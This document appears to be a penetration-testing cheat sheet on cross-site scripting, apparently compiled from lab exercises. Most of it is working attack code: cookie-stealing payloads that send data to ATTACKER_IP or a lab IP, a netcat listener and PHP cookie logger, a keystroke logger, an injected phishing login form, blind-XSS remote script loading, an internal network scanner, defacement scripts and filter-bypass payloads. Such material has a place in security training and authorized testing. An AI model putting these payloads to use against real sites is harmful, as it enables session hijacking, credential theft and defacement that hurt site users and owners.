# XSS

## XSS Types

| Type | Description |
|------|-------------|
| **Stored (Persistent)** | Input stored in DB, displayed to all users (most critical) |
| **Reflected (Non-Persistent)** | Input reflected in response (e.g., search, error messages) |
| **DOM-based** | Processed client-side via JavaScript, never reaches server |

---

## Test Payloads

### Basic Test

```html
<script>alert(window.origin)</script>
```

### Alternatives (if alert blocked)

```html
<plaintext>
<script>print()</script>
<img src=x onerror=alert(1)>
```

### DOM XSS (when script tags blocked)

```html
<img src="" onerror=alert(window.origin)>
```

---

## XSS Discovery Tools

```bash
# XSS Strike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/page.php?param=test"

# Other tools
# - Brute XSS: https://github.com/rajeshmajumdar/BruteXSS
# - XSSer: https://github.com/epsylon/xsser
```

---

## Reflected XSS Exploitation

1. Find reflected parameter (check Network tab for GET/POST)
2. Inject payload in URL parameter
3. Send malicious URL to victim:

```
http://TARGET/search.php?q=<script>alert(1)</script>
```

---

## DOM XSS - Source & Sink

### Common Sources (user input)

```javascript
document.URL
document.location
document.referrer
window.location
location.search
location.hash
```

### Dangerous Sinks (vulnerable functions)

```javascript
// JavaScript
document.write()
document.innerHTML
document.outerHTML

// jQuery
html()
append()
after()
add()
```

---

## Stored XSS
### Key Logger
````
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
````
### Chat Room XSS
- Start a netcat listener on your attack box
````
nc -nlvp 4444
````
- Take this XSS payload and paste it in the chat room and submit:
````
<script>window.location='http://10.13.**.**:4444/?cookie='+document.cookie</script>
````
- Note: Send the payload and then open the listener 
## Stored XSS Payloads
- Stored XSS pop up to display your cookies, good for a POC
````
<script>alert(document.cookie)</script>
````
- Adding HTML to a website
````
<title>Example document: XSS Doc</title>
````
- Deface website title. You will need inspect element and find the name of the element you want to change. `thm-title` is the element name in this example.
````
<script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>
````
## DOM-Based XSS

### Internal Network Scanner

```javascript
<script>
for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i
  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
}
</script>
```

---

## Website Defacing

### Change Background

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "http://ATTACKER/image.jpg"</script>
```

### Change Title

```html
<script>document.title = 'Hacked'</script>
```

### Replace Page Content

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>
```

### Remove Element

```javascript
document.getElementById('elementId').remove();
```

---

## XSS Phishing

### Inject Login Form

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('originalForm').remove();
```

### Comment Out Remaining HTML

```html
...PAYLOAD... <!--
```

---

## Session Hijacking / Cookie Stealing

### Cookie Stealing Payloads

```javascript
// Redirect method
document.location='http://ATTACKER_IP/steal.php?c='+document.cookie;

// Image method (stealthier)
new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie;
```

### PHP Cookie Logger (steal.php)

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Start Listener

```bash
# Simple netcat
sudo nc -lvnp 80

# PHP server (better - handles HTTP properly)
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# create steal.php with above code
sudo php -S 0.0.0.0:80
```

---

## Blind XSS Detection

### Remote Script Loading (per field)

```html
<script src=http://ATTACKER_IP/fullname></script>
<script src=http://ATTACKER_IP/username></script>
<script src=http://ATTACKER_IP/email></script>
```

### Blind XSS Payloads

```html
<script src=http://ATTACKER_IP></script>
'><script src=http://ATTACKER_IP></script>
"><script src=http://ATTACKER_IP></script>
<script>$.getScript("http://ATTACKER_IP")</script>
```

### script.js for Cookie Stealing

```javascript
new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie
```

---

## Common Injection Contexts

| Context | Payload |
|---------|---------|
| Inside `<script>` | `';alert(1)//` or `";alert(1)//` |
| HTML attribute | `" onmouseover=alert(1)` |
| HTML tag | `<img src=x onerror=alert(1)>` |
| URL parameter | `javascript:alert(1)` |
| Event handler | `'-alert(1)-'` |

---

## Bypass Techniques

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>
```

### Encoding

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### No Parentheses

```html
<script>alert`1`</script>
<img src=x onerror=alert`1`>
```

### No Quotes

```html
<script>alert(String.fromCharCode(88,83,83))</script>
```

---

## Filter Bypass Payloads

```html
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```






















































